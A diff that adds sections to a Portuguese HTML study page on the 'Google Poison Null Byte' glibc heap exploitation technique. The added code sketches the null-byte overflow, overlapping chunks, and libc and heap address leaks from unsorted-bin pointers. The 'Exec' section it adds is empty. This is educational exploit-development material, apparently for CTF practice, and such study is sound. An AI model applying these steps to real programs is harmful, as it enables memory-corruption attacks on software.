@@ -145,6 +145,15 @@
 <li><a href="#google-poison-null-byte">Google Poison Null Byte</a></li>
 <li><a href="#prerrequisitos">Prerrequisitos</a></li>
 <li><a href="#ataque">Ataque</a></li>
+<li><a href="#resumo">Resumo</a></li>
+<li><a href="#info-leaks">info leaks</a>
+<ul>
+<li><a href="#libc">Libc</a></li>
+<li><a href="#heap">Heap</a></li>
+<li><a href="#full">Full</a></li>
+</ul>
+</li>
+<li><a href="#exec">Exec</a></li>
 </ul>
 <p>Essa tecnica se parece com a House of Einherjar, porem nela nos 
 precisávamos usar null bytes no <code>prev_size</code> e dado que overflows 
@@ -486,12 +495,88 @@ existe um monte de metadados largados la no meio (por exemplo, no
 espaço DIFF), ou os próprios pointers do chunk_B2
 
 </code></pre>
-<p>Agora com esse primitivo, voce poderia fazer muitas coisas, 
-por exemplo, um libc leak: </p>
-<ul>
-<li><code>chunk_E</code> = <code>malloc</code>(<code>size chunk_B1</code>)</li>
-<li><code>read</code>(<code>chunk_B2</code>)</li>
-</ul>
+<h1 id="resumo"><a class="header" href="#resumo">Resumo</a></h1>
+<pre><code class="language-py"># Google Poison Null
+
+chunk_A = malloc(0x88)   # Qualquer size
+chunk_B = malloc(0x108)  # Size: 0x110 -&gt; 0x100
+chunk_C = malloc(0x88)   # Size normal
+chunk_TOP = malloc(0x88) # Prevenir Consolidação
+
+#edit(chunk_B, &quot;\x00&quot;*0xf0 + p16(0x100)) # size vs prev size
+free(chunk_B)
+edit(chunk_A, b&quot;\x00&quot;*0x88) # NULL Overflow: Diff=0x10, prev_use=0
+
+chunk_B1 = malloc(0x88)
+chunk_B2 = malloc(0x68)
+
+free(chunk_B1)
+free(chunk_C)
+</code></pre>
+<h1 id="info-leaks"><a class="header" href="#info-leaks">info leaks</a></h1>
+<blockquote>
+<p>Essas técnicas também funcionam para a House of Einherjar</p>
+</blockquote>
+<h2 id="libc"><a class="header" href="#libc">Libc</a></h2>
+<p>Para um libc leak, basta alocar a primeira metade do <code>chunk_B + chunk_C</code></p>
+<pre><code class="language-py">chunk_B1 = malloc(0x88)
+</code></pre>
+<p>Os metadados vao parar no chunk_B2, então basta ler o <code>fd</code> ou <code>bk</code> dele</p>
+<pre><code class="language-py">chunk_B1 = malloc(0x88)
+libc_leak = u64(read(chunk_B2, 8))
+</code></pre>
+<h2 id="heap"><a class="header" href="#heap">Heap</a></h2>
+<p>Para o heap precisamos fazer a mesma coisa que o libc, porem se dermos <code>free()</code> em algum chunk 
+que va para os <strong>UNSORTED</strong>, o chunk_B2.<code>bk</code> vai apontar para ele</p>
+<p>Assim, no read do chunk_B2, vamos precisar separar os dois:</p>
+<pre><code class="language-py">leak = read(chunk_B2, 16)
+free()
+
+libc_leak = u64(leak[:8]) # fd -&gt; main_arena unsorted bins
+heap_leak = u64(leak[8:]) # bk -&gt; heap_leak
+</code></pre>
+<p>A opção mais fácil é o chunk_A, pq o endereço dele é o mesmo do heap nesse caso</p>
+<pre><code class="language-py">chunk_B1 = malloc(0x88)
+free(chunk_A)
+
+leak = read(chunk_B2, 16)
+
+libc_leak = u64(leak[:8]) # fd -&gt; main_arena unsorted bins
+heap_leak = u64(leak[8:]) # bk -&gt; chunk_A
+</code></pre>
+<h2 id="full"><a class="header" href="#full">Full</a></h2>
+<p>Assim, unindo todos os infoleaks</p>
+<pre><code class="language-py"># Google Poison Null
+
+chunk_A = malloc(0x88)   # Qualquer size
+chunk_B = malloc(0x108)  # Size: 0x110 -&gt; 0x100
+chunk_C = malloc(0x88)   # Size normal
+chunk_TOP = malloc(0x88) # Prevenir Consolidação
+
+#edit(chunk_B, &quot;\x00&quot;*0xf0 + p16(0x100)) # size vs prev size
+free(chunk_B)
+edit(chunk_A, b&quot;\x00&quot;*0x88) # NULL Overflow: Diff=0x10, prev_use=0
+
+chunk_B1 = malloc(0x88)
+chunk_B2 = malloc(0x68)
+
+free(chunk_B1)
+free(chunk_C)
+
+# Info leaks
+
+chunk_B1 = malloc(0x88)
+free(chunk_A) # unsorted bins -&gt; heap leak
+
+leak = read(chunk_B2, 16)
+libc_leak = u64(leak[:8]) # fd -&gt; main_arena unsorted bins
+heap_leak = u64(leak[8:]) # bk -&gt; chunk_A
+
+libc.address = libc_leak - libc.sym.main_arena - 88
+#log.success(&quot;Libc Addr (pwndbg: vmmap libc ou libs): &quot;+ hex(libc.sym.__malloc_hook))
+#log.success(&quot;Heap: &quot;+hex(heap_leak))
+</code></pre>
+<h1 id="exec"><a class="header" href="#exec">Exec</a></h1>
 
                     </main>
 
